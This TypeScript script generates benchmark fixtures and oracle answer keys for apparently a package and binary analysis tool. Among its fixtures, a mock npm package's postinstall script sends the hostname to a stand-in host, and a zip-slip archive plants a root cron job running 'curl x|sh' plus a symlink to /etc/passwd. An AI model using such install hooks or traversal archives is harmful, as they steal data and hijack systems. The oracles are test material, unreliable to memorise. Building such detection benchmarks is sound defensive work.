// Generates the bench task fixtures into bench/tasks/fixtures/ and the task files
// bench/tasks/<id>.json (question + oracle). Deterministic: running it twice gives the same bytes.
//
//   node bench/tasks/make-fixtures.ts            write fixtures and task files
//   node bench/tasks/make-fixtures.ts <outDir>   write fixtures under <outDir> (tests compare)

import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import {
  gzipStored,
  makeElf64,
  makeFat,
  makeMachO,
  makeNpmTgz,
  makePe64,
  makeTar,
  makeZip,
} from "../../test/fixtures/probes/gen.ts";

export interface OracleEntry {
  predicate: string;
  params: Record<string, unknown>;
  expect: "verified" | "refuted" | "unverifiable";
}

export interface BenchTask {
  id: string;
  title: string;
  /** Directory, relative to bench/tasks/, that is the workspace for every path below. */
  workspace: string;
  subjectFiles: string[];
  question: string;
  oracle: OracleEntry[];
}

const enc = new TextEncoder();
type Files = Record<string, Uint8Array | string>;

function sha(b: Uint8Array | string): string {
  return createHash("sha256").update(b).digest("hex");
}

export function buildTasks(): { files: Files; tasks: BenchTask[] } {
  const files: Files = {};
  const tasks: BenchTask[] = [];
  const add = (rel: string, data: Uint8Array | string) => {
    files[rel] = data;
    return rel;
  };

  // 1. npm package with a postinstall script
  const evilPkg = {
    name: "evil-helper",
    version: "1.0.0",
    main: "index.js",
    scripts: { postinstall: "node scripts/setup.js", test: "node --test" },
    dependencies: { "tiny-fetch": "^2.1.0" },
  };
  const setupJs =
    'const https = require("https");\nconst os = require("os");\n' +
    'https.get("https://collect.badhost.example.net/i?h=" + os.hostname());\n';
  add("postinstall/evil-helper/package.json", `${JSON.stringify(evilPkg, null, 2)}\n`);
  add("postinstall/evil-helper/index.js", "module.exports = (a, b) => a + b;\n");
  add("postinstall/evil-helper/scripts/setup.js", setupJs);
  add(
    "postinstall/evil-helper-1.0.0.tgz",
    makeNpmTgz(evilPkg, { "index.js": "module.exports = (a, b) => a + b;\n", "scripts/setup.js": setupJs }),
  );
  tasks.push({
    id: "npm-postinstall",
    title: "npm package with a postinstall script",
    workspace: "fixtures",
    subjectFiles: ["postinstall/evil-helper", "postinstall/evil-helper-1.0.0.tgz"],
    question: "Does installing evil-helper run code, and what does that code contact?",
    oracle: [
      {
        predicate: "pkg.has-install-script",
        params: { path: "postinstall/evil-helper", hook: "postinstall" },
        expect: "verified",
      },
      {
        predicate: "pkg.has-install-script",
        params: { path: "postinstall/evil-helper", hook: "preinstall" },
        expect: "refuted",
      },
      {
        predicate: "pkg.has-install-script",
        params: { path: "postinstall/evil-helper-1.0.0.tgz" },
        expect: "verified",
      },
      {
        predicate: "pkg.has-dependency",
        params: { path: "postinstall/evil-helper-1.0.0.tgz", name: "tiny-fetch" },
        expect: "verified",
      },
      {
        predicate: "pkg.has-dependency",
        params: { path: "postinstall/evil-helper", name: "lodash" },
        expect: "refuted",
      },
      {
        predicate: "endpoint.present",
        params: { path: "postinstall/evil-helper/scripts/setup.js", host: "collect.badhost.example.net" },
        expect: "verified",
      },
      {
        predicate: "endpoint.present",
        params: { path: "postinstall/evil-helper/scripts/setup.js", host: "cdn.example.org" },
        expect: "refuted",
      },
      {
        predicate: "js.imports",
        params: { path: "postinstall/evil-helper/scripts/setup.js", specifier: "https" },
        expect: "verified",
      },
      {
        predicate: "js.imports",
        params: { path: "postinstall/evil-helper/scripts/setup.js", specifier: "child_process" },
        expect: "refuted",
      },
      {
        predicate: "archive.contains",
        params: { path: "postinstall/evil-helper-1.0.0.tgz", entry: "package/scripts/setup.js" },
        expect: "verified",
      },
    ],
  });

  // 2. package with a native add-on
  const addon = makeElf64({
    needed: ["libcrypto.so.3", "libc.so.6"],
    interp: null,
    exports: ["napi_register_module_v1"],
    imports: ["EVP_DigestInit_ex", "napi_create_function"],
  });
  add(
    "native-addon/fast-hash/package.json",
    `${JSON.stringify({ name: "fast-hash", version: "3.1.0", main: "index.js", gypfile: true, dependencies: { "node-gyp-build": "^4.8.0" } }, null, 2)}\n`,
  );
  add(
    "native-addon/fast-hash/binding.gyp",
    '{ "targets": [ { "target_name": "fast_hash", "sources": [ "src/hash.cc" ] } ] }\n',
  );
  add("native-addon/fast-hash/index.js", 'module.exports = require("node-gyp-build")(__dirname);\n');
  add("native-addon/fast-hash/build/Release/fast_hash.node", addon);
  add("native-addon/fast-hash/prebuilds/linux-x64/fast-hash.node", addon);
  tasks.push({
    id: "native-addon",
    title: "package with a native add-on",
    workspace: "fixtures",
    subjectFiles: ["native-addon/fast-hash"],
    question: "Does fast-hash ship native code, what does it link, and does it build at install time?",
    oracle: [
      {
        predicate: "pkg.has-install-script",
        params: { path: "native-addon/fast-hash", hook: "install" },
        expect: "verified",
      },
      {
        predicate: "pkg.has-dependency",
        params: { path: "native-addon/fast-hash", name: "node-gyp-build" },
        expect: "verified",
      },
      {
        predicate: "native.links",
        params: { path: "native-addon/fast-hash/build/Release/fast_hash.node", library: "libcrypto.so.3" },
        expect: "verified",
      },
      {
        predicate: "native.links",
        params: { path: "native-addon/fast-hash/build/Release/fast_hash.node", library: "libssl.so.3" },
        expect: "refuted",
      },
      {
        predicate: "file.identify",
        params: { path: "native-addon/fast-hash/build/Release/fast_hash.node", format: "elf" },
        expect: "verified",
      },
      {
        predicate: "file.identify",
        params: { path: "native-addon/fast-hash/build/Release/fast_hash.node", format: "pe" },
        expect: "refuted",
      },
    ],
  });

  // 3. ELF binary facts
  const elf = makeElf64({
    needed: ["libz.so.1", "libcurl.so.4", "libc.so.6"],
    runpath: "$ORIGIN/../lib",
    exports: ["tool_main", "tool_version"],
    imports: ["curl_easy_init", "deflate", "printf"],
  });
  add("elf/tool", elf);
  tasks.push({
    id: "elf-facts",
    title: "ELF binary facts",
    workspace: "fixtures",
    subjectFiles: ["elf/tool"],
    question: "What does elf/tool link, and which loader does it use?",
    oracle: [
      { predicate: "native.links", params: { path: "elf/tool", library: "libcurl.so.4" }, expect: "verified" },
      { predicate: "native.links", params: { path: "elf/tool", library: "libz" }, expect: "verified" },
      { predicate: "native.links", params: { path: "elf/tool", library: "libssl.so.3" }, expect: "refuted" },
      { predicate: "file.identify", params: { path: "elf/tool", format: "elf" }, expect: "verified" },
      {
        predicate: "file.contains",
        params: { path: "elf/tool", text: "/lib64/ld-linux-x86-64.so.2" },
        expect: "verified",
      },
      { predicate: "file.contains", params: { path: "elf/tool", hex: "7f454c46", offset: 0 }, expect: "verified" },
      { predicate: "file.contains", params: { path: "elf/tool", hex: "4d5a", offset: 0 }, expect: "refuted" },
      { predicate: "file.hash", params: { path: "elf/tool", sha256: sha(elf) }, expect: "verified" },
      { predicate: "file.hash", params: { path: "elf/tool", sha256: sha("not the tool") }, expect: "refuted" },
    ],
  });

  // 4. PE facts
  add(
    "pe/agent.exe",
    makePe64({
      imports: {
        "KERNEL32.dll": ["CreateFileW", "WriteFile", "CreateProcessW"],
        "WININET.dll": ["InternetOpenW", "InternetOpenUrlW"],
        "ADVAPI32.dll": ["RegSetValueExW"],
      },
      timestamp: 0x60000000,
      subsystem: 2,
    }),
  );
  add("pe/helper.dll", makePe64({ dll: true, dllName: "helper.dll", exports: ["HelperStart", "HelperStop"] }));
  tasks.push({
    id: "pe-facts",
    title: "PE facts",
    workspace: "fixtures",
    subjectFiles: ["pe/agent.exe", "pe/helper.dll"],
    question: "Which DLLs does agent.exe import, and does it touch the network or the registry?",
    oracle: [
      { predicate: "native.links", params: { path: "pe/agent.exe", library: "wininet.dll" }, expect: "verified" },
      { predicate: "native.links", params: { path: "pe/agent.exe", library: "ADVAPI32.dll" }, expect: "verified" },
      { predicate: "native.links", params: { path: "pe/agent.exe", library: "ws2_32.dll" }, expect: "refuted" },
      { predicate: "file.identify", params: { path: "pe/agent.exe", format: "pe" }, expect: "verified" },
      { predicate: "file.identify", params: { path: "pe/helper.dll", format: "elf" }, expect: "refuted" },
      { predicate: "file.contains", params: { path: "pe/agent.exe", text: "InternetOpenUrlW" }, expect: "verified" },
    ],
  });

  // 5. Mach-O facts
  const dylibs = [
    "/usr/lib/libSystem.B.dylib",
    "/System/Library/Frameworks/Security.framework/Versions/A/Security",
    "@rpath/libsparkle.dylib",
  ];
  const x64 = makeMachO({ dylibs, rpaths: ["@executable_path/../Frameworks"], codeSignature: true });
  const arm = makeMachO({ cpu: "arm64", dylibs, rpaths: ["@executable_path/../Frameworks"], codeSignature: true });
  add(
    "macho/Updater",
    makeFat([
      { cpu: "x86_64", bytes: x64 },
      { cpu: "arm64", bytes: arm },
    ]),
  );
  tasks.push({
    id: "macho-facts",
    title: "Mach-O facts",
    workspace: "fixtures",
    subjectFiles: ["macho/Updater"],
    question: "Which architectures does macho/Updater contain, and what does it link?",
    oracle: [
      { predicate: "file.identify", params: { path: "macho/Updater", format: "macho-fat" }, expect: "verified" },
      { predicate: "file.identify", params: { path: "macho/Updater", format: "mach-o" }, expect: "verified" },
      { predicate: "file.identify", params: { path: "macho/Updater", format: "elf" }, expect: "refuted" },
      { predicate: "native.links", params: { path: "macho/Updater", library: "Security" }, expect: "verified" },
      { predicate: "native.links", params: { path: "macho/Updater", library: "libsparkle.dylib" }, expect: "verified" },
      {
        predicate: "native.links",
        params: { path: "macho/Updater", library: "/usr/lib/libcurl.4.dylib" },
        expect: "refuted",
      },
    ],
  });

  // 6. JS app with dynamic import, worker URL and endpoints
  add(
    "js-app/src/main.js",
    [
      'import { readConfig } from "./util.js";',
      'import path from "node:path";',
      'const cfg = readConfig(path.join(process.cwd(), "app.json"));',
      "export async function loadPlugin(name) {",
      '  return import("./plugins/" + name + ".js");',
      "}",
      'const worker = new Worker(new URL("./worker.js", import.meta.url), { type: "module" });',
      'fetch("https://api.telemetry-example.io/v2/events", { method: "POST", body: JSON.stringify(cfg) });',
      'const live = new WebSocket("wss://live.example.org/socket");',
      "// TODO: drop the old host legacy.example.net",
      "",
    ].join("\n"),
  );
  add(
    "js-app/src/util.js",
    'import { readFileSync } from "node:fs";\nexport const readConfig = (p) => JSON.parse(readFileSync(p, "utf8"));\n',
  );
  add("js-app/src/worker.js", "self.onmessage = (e) => postMessage(e.data);\n");
  add("js-app/src/plugins/a.js", "export default 1;\n");
  tasks.push({
    id: "js-app",
    title: "JS app with dynamic import, worker URL and endpoints",
    workspace: "fixtures",
    subjectFiles: ["js-app/src"],
    question: "Which modules and hosts does js-app load or contact?",
    oracle: [
      { predicate: "js.imports", params: { path: "js-app/src/main.js", specifier: "./util.js" }, expect: "verified" },
      { predicate: "js.imports", params: { path: "js-app/src/main.js", specifier: "./worker.js" }, expect: "verified" },
      {
        predicate: "js.imports",
        params: { path: "js-app/src/main.js", specifier: "./plugins/a.js" },
        expect: "unverifiable",
      },
      { predicate: "js.imports", params: { path: "js-app/src/main.js", specifier: "lodash" }, expect: "unverifiable" },
      { predicate: "js.imports", params: { path: "js-app/src/util.js", specifier: "node:fs" }, expect: "verified" },
      { predicate: "js.imports", params: { path: "js-app/src/util.js", specifier: "axios" }, expect: "refuted" },
      {
        predicate: "endpoint.present",
        params: { path: "js-app/src/main.js", host: "api.telemetry-example.io" },
        expect: "verified",
      },
      {
        predicate: "endpoint.present",
        params: { path: "js-app/src/main.js", host: "live.example.org" },
        expect: "verified",
      },
      {
        predicate: "endpoint.present",
        params: { path: "js-app/src/main.js", host: "legacy.example.net" },
        expect: "unverifiable",
      },
      {
        predicate: "endpoint.present",
        params: { path: "js-app/src/main.js", host: "evil.example.com" },
        expect: "refuted",
      },
    ],
  });

  // 7. version pair
  const v = (deps: Record<string, string>, ver: string) =>
    `${JSON.stringify({ name: "widget", version: ver, main: "index.js", dependencies: deps }, null, 2)}\n`;
  add("version-pair/v1/package.json", v({ "left-pad": "^1.3.0" }, "1.0.0"));
  add("version-pair/v1/index.js", 'export const ping = () => fetch("https://api.stable.example.com/ping");\n');
  add("version-pair/v2/package.json", v({ "left-pad": "^1.3.0", "telemetry-lite": "^0.3.0" }, "2.0.0"));
  add(
    "version-pair/v2/index.js",
    'import "telemetry-lite";\nexport const ping = () => fetch("https://api.stable.example.com/ping");\n' +
      'export const report = (e) => fetch("https://metrics.newhost.example.io/collect", { method: "POST", body: e });\n',
  );
  tasks.push({
    id: "version-pair",
    title: "version pair: v1 vs v2 (added dependency, new endpoint)",
    workspace: "fixtures",
    subjectFiles: ["version-pair/v1", "version-pair/v2"],
    question: "What changed between widget v1 and v2?",
    oracle: [
      {
        predicate: "pkg.has-dependency",
        params: { path: "version-pair/v2", name: "telemetry-lite" },
        expect: "verified",
      },
      {
        predicate: "pkg.has-dependency",
        params: { path: "version-pair/v1", name: "telemetry-lite" },
        expect: "refuted",
      },
      {
        predicate: "endpoint.present",
        params: { path: "version-pair/v2/index.js", host: "metrics.newhost.example.io" },
        expect: "verified",
      },
      {
        predicate: "endpoint.present",
        params: { path: "version-pair/v1/index.js", host: "metrics.newhost.example.io" },
        expect: "refuted",
      },
      {
        predicate: "endpoint.present",
        params: { path: "version-pair/v1/index.js", host: "api.stable.example.com" },
        expect: "verified",
      },
      {
        predicate: "js.imports",
        params: { path: "version-pair/v2/index.js", specifier: "telemetry-lite" },
        expect: "verified",
      },
      {
        predicate: "js.imports",
        params: { path: "version-pair/v1/index.js", specifier: "telemetry-lite" },
        expect: "refuted",
      },
    ],
  });

  // 8. archive with a zip-slip entry
  add(
    "zip-slip/update.zip",
    makeZip([
      { name: "app/", dir: true },
      { name: "app/readme.txt", data: "update 4.2\n" },
      { name: "app/bin/run.sh", data: "#!/bin/sh\necho run\n" },
      { name: "../../etc/cron.d/evil", data: "* * * * * root sh -c 'curl x|sh'\n" },
      { name: "app/link", symlink: "../../../../etc/passwd" },
    ]),
  );
  add(
    "zip-slip/update.tar.gz",
    gzipStored(
      makeTar([
        { name: "ok.txt", data: "ok\n" },
        { name: "../outside.txt", data: "x\n" },
      ]),
    ),
  );
  tasks.push({
    id: "zip-slip",
    title: "archive with a zip-slip entry",
    workspace: "fixtures",
    subjectFiles: ["zip-slip/update.zip", "zip-slip/update.tar.gz"],
    question: "Is it safe to extract update.zip?",
    oracle: [
      {
        predicate: "archive.contains",
        params: { path: "zip-slip/update.zip", entry: "../../etc/cron.d/evil" },
        expect: "verified",
      },
      {
        predicate: "archive.contains",
        params: { path: "zip-slip/update.zip", entry: "app/readme.txt" },
        expect: "verified",
      },
      {
        predicate: "archive.contains",
        params: { path: "zip-slip/update.zip", entry: "app/missing.txt" },
        expect: "refuted",
      },
      {
        predicate: "archive.contains",
        params: { path: "zip-slip/update.tar.gz", entry: "../outside.txt" },
        expect: "verified",
      },
      { predicate: "file.identify", params: { path: "zip-slip/update.zip", format: "zip" }, expect: "verified" },
      { predicate: "file.identify", params: { path: "zip-slip/update.tar.gz", format: "gzip" }, expect: "verified" },
    ],
  });
  for (const k of Object.keys(files)) if (typeof files[k] === "string") files[k] = enc.encode(files[k] as string);
  return { files, tasks };
}

const FIXTURE_BIOME = {
  root: false,
  formatter: { enabled: false },
  linter: { enabled: false },
  assist: { enabled: false },
};

export function writeFixtures(outDir: string): string[] {
  const { files } = buildTasks();
  rmSync(outDir, { recursive: true, force: true });
  for (const [rel, data] of Object.entries(files)) {
    mkdirSync(dirname(join(outDir, rel)), { recursive: true });
    writeFileSync(join(outDir, rel), data);
  }
  // Fixture sources are test data: keep the linter and formatter off them (nested Biome config).
  writeFileSync(join(outDir, "biome.json"), `${JSON.stringify(FIXTURE_BIOME, null, 2)}\n`);
  return Object.keys(files).sort();
}

const HERE = dirname(fileURLToPath(import.meta.url));
const isMain = process.argv[1] !== undefined && resolve(process.argv[1]) === fileURLToPath(import.meta.url);
if (isMain) {
  const out = process.argv[2] ? resolve(process.argv[2]) : join(HERE, "fixtures");
  const written = writeFixtures(out);
  if (!process.argv[2])
    for (const t of buildTasks().tasks) {
      // Rewrite a task file only when its content changed, so formatter output survives reruns.
      const file = join(HERE, `${t.id}.json`);
      const same = existsSync(file) && JSON.stringify(JSON.parse(readFileSync(file, "utf8"))) === JSON.stringify(t);
      if (!same) writeFileSync(file, `${JSON.stringify(t, null, 2)}\n`);
    }
  process.stdout.write(`wrote ${written.length} fixture files to ${out}\n`);
}
